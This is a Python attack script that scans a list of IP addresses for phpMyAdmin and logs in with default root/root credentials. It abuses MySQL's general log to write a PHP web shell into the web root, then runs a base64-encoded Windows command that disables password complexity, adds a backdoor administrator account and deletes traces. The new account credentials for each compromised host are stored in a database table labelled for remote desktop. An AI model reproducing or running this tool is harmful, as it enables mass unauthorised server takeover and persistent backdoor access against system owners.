import re
import time
import base64
import string
import random
import pymysql
import datetime
import requests
from bs4 import BeautifulSoup
 
def get_ip_list():
    with open('ip.txt','r')as f:
        ip_list = f.readlines()
    return ip_list
 
def get_token(ip):
    url = 'http://'+ip+'/phpmyadmin/index.php'
    y = requests.get(url,timeout = 1)
    token = re.search('token=.*" t',y.text).group()[6:-3]
    cookie_1 =y.cookies
    return url,token,cookie_1
 
def login(url,token,cookie_1):
    payload = {'pma_username': 'root', 'pma_password': 'root','server':'1 ','lang':'zh_CN','token':token}
    r = requests.post(url,data=payload,cookies = cookie_1,allow_redirects=False)
    cookie_2 = r.cookies
    if 'name="login_form"' not in r.text:
        print('使用默认密码登录成功！')
        return cookie_2
    else:
        print('登录失败！')
        return False
 
def get_cookie(cookie_1,cookie_2):
    dict_1 = requests.utils.dict_from_cookiejar(cookie_1)
    dict_2 = requests.utils.dict_from_cookiejar(cookie_2)
    dict_3 = dict(dict_1,**dict_2)
    cookies = requests.utils.cookiejar_from_dict(dict_3)
    return cookies
 
def execute_sql(token,ip,cookies):
    sql_url = 'http://' + ip + '/phpmyadmin/import.php'
    text = ['select @@datadir','SET GLOBAL general_log=ON',
            'set global general_log=off;set global general_log_file="MYSQL.log";']
 
    def modle(sql_text):
        data = {'token': token, 'sql_query': sql_text}
        sql = requests.post(sql_url, data=data, cookies=cookies)
        soup = BeautifulSoup(sql.text, 'lxml')
        tag = soup.find_all('td')
        for i in tag:
            if i.string:
                print(i.string)
                result = i.string
                return result
 
    def get_path():
        path = modle(text[0])
        path = re.search('.*M', path).group()[:-1].replace('\\','/')+'www/phpinfo.php'
        print(path)
        return path
 
    def create_file():
        file_path = 'set global general_log_file ="'+ get_path()+'"'
        modle(file_path)
        print(file_path)
        modle(text[1])
 
    def random_str():
        random_str = ''.join(random.sample(string.ascii_letters, 8))
        return random_str
 
    def generate_random_exp():
        user = random_str() + '$'
        pwd = random_str()
        exp = '''echo [version] &gt; 1.inf &amp;&amp; echo signature="$CHICAGO$" &gt;&gt; 1.inf &amp;&amp; 
        echo [System Access] &gt;&gt; 1.inf &amp;&amp; echo PasswordComplexity = 0 &gt;&gt; 1.inf &amp;&amp; secedit 
        /configure /db temp.sdb /cfg 1.inf &amp; net user ''' + user+ ' ' + pwd + ''' /add &amp; net 
        localgroup administrators ''' + user + ''' /add &amp;&amp; echo GetSuccess! &amp; del 1.inf 
        temp.sdb phpinfo.php &amp;&amp; echo DeleteSuccess! '''
        exp_base64 = base64.b64encode(exp.encode('utf-8')).decode('utf-8')
        exp_code = '''select '&lt;?php $str ="''' + exp_base64 + '''"; $code = base64_decode($str)
        ;echo `$code`;?&gt;';'''
        modle(exp_code)
        return user, pwd
 
    def check_exp():
        url_2 = 'http://' + ip + '/phpinfo.php'
        check = requests.get(url_2)
        time.sleep(5)
        print(check.text)
        if 'GetSuccess!' in check.text:
            print('Success !!!')
            return ip
        else:
            print('Failed !')
 
    def delete():
        modle(text[2])
 
    create_file()
    user,pwd = generate_random_exp()
    if check_exp() is None:
        return False
    delete()
    return user,pwd,ip
 
def main():
    db = pymysql.Connect('ip', 'user', 'pwd', 'phpmyadmin')
    cursor = db.cursor()
    ip_list =get_ip_list()
    for ip in ip_list:
        try:
            ip = ip.strip()
            url, token, cookie_1 = get_token(ip)
            print(ip)
            if len(token) != 32:
                print('token 错误！')
                continue
            cookie_2 = login(url, token, cookie_1)
            if cookie_2 is False:
                continue
            cookies = get_cookie(cookie_1, cookie_2)
            user, pwd, ip = execute_sql(token, ip, cookies)
            if user and pwd and ip:
                time_now = str(datetime.datetime.now())[:-7]
                sql = "insert into rdesktop (user,pwd,ip,time) VALUES  ('%s','%s','%s','%s')" % (user,pwd,ip,time_now)
                print(sql)
                cursor.execute(sql)
                db.commit()
            else:
                continue
        except Exception as e:
            print(e)
    db.close()
 
if __name__=='__main__':
    main()
